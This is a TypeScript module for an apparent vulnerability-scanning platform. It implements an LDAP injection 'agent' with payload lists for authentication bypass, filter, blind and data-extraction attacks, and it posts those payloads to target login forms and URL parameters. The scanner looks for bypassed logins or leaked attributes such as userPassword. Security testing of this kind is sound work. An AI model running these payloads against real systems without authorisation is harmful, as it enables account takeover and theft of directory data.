/**
 * LDAP Injection Agent
 * Based on PayloadsAllTheThings/LDAP Injection
 * 
 * Detects and exploits LDAP injection vulnerabilities:
 * - Authentication bypass
 * - Data extraction
 * - Blind LDAP injection
 * - Filter manipulation
 * - DN injection
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface LDAPJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testAuthBypass?: boolean;
    testBlind?: boolean;
    extractData?: boolean;
  };
}

// LDAP Injection Payloads
const LDAP_PAYLOADS = {
  // Authentication bypass
  authBypass: [
    '*',
    '*)(&',
    '*)(|(&',
    'admin)(&)',
    'admin)(|(password=*)',
    '*)((|userPassword=*)',
    '*)(uid=*))(|(uid=*',
    'admin)(!(&(1=0',
    'x])(|(cn=*)',
    '*)(objectClass=*)',
  ],

  // OR-based injection
  orBased: [
    '*)(|(objectClass=*)',
    '*)(|(uid=*)',
    '*)(|(cn=*)',
    '*)(|(sn=*)',
    '*)(|(mail=*)',
    'admin)(|(password=*))',
  ],

  // AND-based injection
  andBased: [
    '*)(&(objectClass=*)',
    '*)(&(uid=admin)',
    '*)(&(cn=admin)',
    'admin)(&(password=*)',
  ],

  // Blind injection (boolean-based)
  blindBoolean: [
    '*)(uid=admin)(|',  // True condition
    '*)(uid=nonexistent)(|',  // False condition
    'admin)(|(objectClass=void',  // Error-based
  ],

  // Blind injection (time-based)
  blindTime: [
    // LDAP doesn't have native sleep, but we can use expensive operations
    '*)(|(uid=*)(uid=*)(uid=*)(uid=*)(uid=*)',
  ],

  // Data extraction
  extraction: [
    '*)(uid=*',
    '*)(cn=*',
    '*)(sn=*',
    '*)(mail=*',
    '*)(userPassword=*',
    '*)(objectClass=*',
    '*)(memberOf=*',
    '*)(telephoneNumber=*',
  ],

  // DN injection
  dnInjection: [
    'admin,dc=evil,dc=com',
    'admin)(|(objectClass=*',
    'cn=admin,dc=company,dc=com',
  ],

  // Special characters
  specialChars: [
    '\\00',  // Null byte
    '\\2a',  // *
    '\\28',  // (
    '\\29',  // )
    '\\5c',  // \
    '\\2f',  // /
  ],

  // Wildcard attacks
  wildcard: [
    'a*',
    '*a*',
    '*@*',
    '*admin*',
    'admin*',
  ],
};

// Common LDAP attributes to extract
const LDAP_ATTRIBUTES = [
  'uid', 'cn', 'sn', 'givenName', 'mail', 'userPassword',
  'telephoneNumber', 'mobile', 'title', 'department',
  'manager', 'memberOf', 'objectClass', 'dn',
];

export class LDAPInjectionAgent extends BaseAgent<LDAPJob> {
  constructor() {
    super('ldapinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify LDAP endpoints', metadata: {} },
      { name: 'Test authentication bypass', metadata: {} },
      { name: 'Test filter injection', metadata: {} },
      { name: 'Test blind injection', metadata: {} },
      { name: 'Attempt data extraction', metadata: {} },
    ];
  }

  async process(job: Job<LDAPJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting LDAP injection testing');

    for (const url of urls) {
      try {
        // Test authentication bypass
        if (options.testAuthBypass !== false) {
          const authFindings = await this.testAuthBypass(url);
          findings.push(...authFindings);
        }

        // Test filter injection
        const filterFindings = await this.testFilterInjection(url);
        findings.push(...filterFindings);

        // Test blind injection
        if (options.testBlind) {
          const blindFindings = await this.testBlindInjection(url);
          findings.push(...blindFindings);
        }

        // Test data extraction
        if (options.extractData) {
          const extractFindings = await this.testDataExtraction(url);
          findings.push(...extractFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing LDAP injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testAuthBypass(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of LDAP_PAYLOADS.authBypass) {
      try {
        // Test in username field
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `username=${encodeURIComponent(payload)}&password=anything`,
        });

        const body = await response.text();

        // Check for successful authentication
        if (this.isAuthSuccess(response, body)) {
          findings.push({
            type: 'ldap-auth-bypass',
            url,
            payload,
            field: 'username',
            severity: 'critical',
            evidence: 'Authentication bypassed with LDAP injection',
            impact: 'Complete authentication bypass',
          });
          break;
        }

        // Test in password field
        const response2 = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `username=admin&password=${encodeURIComponent(payload)}`,
        });

        const body2 = await response2.text();

        if (this.isAuthSuccess(response2, body2)) {
          findings.push({
            type: 'ldap-auth-bypass',
            url,
            payload,
            field: 'password',
            severity: 'critical',
            evidence: 'Authentication bypassed with LDAP injection in password',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testFilterInjection(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    // Test each parameter
    for (const [param, value] of urlObj.searchParams.entries()) {
      for (const payload of [...LDAP_PAYLOADS.orBased, ...LDAP_PAYLOADS.andBased]) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, payload);

          const response = await fetch(testUrl.toString());
          const body = await response.text();

          // Check for LDAP-related errors or data leakage
          if (this.hasLDAPError(body) || this.hasDataLeakage(body)) {
            findings.push({
              type: 'ldap-filter-injection',
              url,
              parameter: param,
              payload,
              severity: 'high',
              evidence: this.hasLDAPError(body) ? 'LDAP error in response' : 'Data leakage detected',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testBlindInjection(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      try {
        // True condition
        const trueUrl = new URL(url);
        trueUrl.searchParams.set(param, LDAP_PAYLOADS.blindBoolean[0]);
        const trueResponse = await fetch(trueUrl.toString());
        const trueBody = await trueResponse.text();

        // False condition
        const falseUrl = new URL(url);
        falseUrl.searchParams.set(param, LDAP_PAYLOADS.blindBoolean[1]);
        const falseResponse = await fetch(falseUrl.toString());
        const falseBody = await falseResponse.text();

        // Compare responses
        if (trueBody.length !== falseBody.length || trueResponse.status !== falseResponse.status) {
          findings.push({
            type: 'ldap-blind-injection',
            url,
            parameter: param,
            severity: 'high',
            evidence: 'Different responses for true/false conditions',
            technique: 'boolean-based',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testDataExtraction(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of LDAP_PAYLOADS.extraction) {
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `search=${encodeURIComponent(payload)}`,
        });

        const body = await response.text();

        // Check for extracted data
        for (const attr of LDAP_ATTRIBUTES) {
          if (body.toLowerCase().includes(attr.toLowerCase() + '=') ||
              body.toLowerCase().includes(`"${attr.toLowerCase()}"`)) {
            findings.push({
              type: 'ldap-data-extraction',
              url,
              payload,
              extractedAttribute: attr,
              severity: 'high',
              evidence: `LDAP attribute "${attr}" found in response`,
            });
          }
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private isAuthSuccess(response: Response, body: string): boolean {
    return response.status === 200 && (
      body.includes('welcome') ||
      body.includes('dashboard') ||
      body.includes('logout') ||
      body.includes('session') ||
      response.headers.get('set-cookie')?.includes('session')
    );
  }

  private hasLDAPError(body: string): boolean {
    const errorPatterns = [
      'ldap', 'invalid filter', 'bad search filter',
      'javax.naming', 'NamingException', 'InvalidSearchFilterException',
      'ldap_search', 'ldap_bind', 'ldap_connect',
      'Active Directory', 'LDAP error',
    ];
    return errorPatterns.some(p => body.toLowerCase().includes(p.toLowerCase()));
  }

  private hasDataLeakage(body: string): boolean {
    const dataPatterns = [
      'uid=', 'cn=', 'dn=', 'dc=', 'ou=',
      'objectClass=', 'userPassword=', 'mail=',
    ];
    return dataPatterns.some(p => body.includes(p));
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store LDAP injection finding');
    }
  }
}

export default new LDAPInjectionAgent();
